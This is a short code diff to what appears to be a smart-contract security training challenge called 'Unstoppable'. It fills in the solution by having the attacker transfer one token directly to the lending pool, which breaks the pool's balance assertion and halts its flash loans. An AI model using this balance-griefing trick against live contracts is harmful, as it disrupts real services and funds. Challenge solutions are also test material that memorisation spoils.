@@ -44,7 +44,10 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR EXPLOIT HERE */
+        // case "assert(poolBalance == balanceBefore);" failed.
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+
     });
 
     after(async function () {
